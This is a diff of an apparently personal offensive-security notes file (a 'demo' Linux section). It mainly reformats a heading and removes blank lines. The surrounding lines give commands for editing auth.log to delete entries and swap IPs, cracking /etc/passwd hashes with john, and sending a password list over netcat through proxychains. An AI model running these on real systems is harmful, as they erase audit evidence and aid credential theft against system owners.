@@ -3897,17 +3897,9 @@ Reading Rsyslog
 
 
 
-## OPNODES LINUX (DEMO)
+# OPNODES 
+## LINUX (DEMO)
 ```
-
-
-
-
-
-
-
-
-
 
 egrep -v '21:51:32|10:02:15' auth.log > auth.log2
 sed -i 's/172.16.34.4/192.168.1.103/g' auth.log2
@@ -3962,13 +3954,6 @@ sudo cat /etc/passwd for the password hashes and then john them to find hashes
 #!/bin/bash
 nc 10.50.37.42 9998 < /home/billybob/10-million-password-list-top-10000.txt
 proxychains nc -lvp 9998 > wo.txt
-
-
-
-
-
-
-
 
 
 Log Cleaning
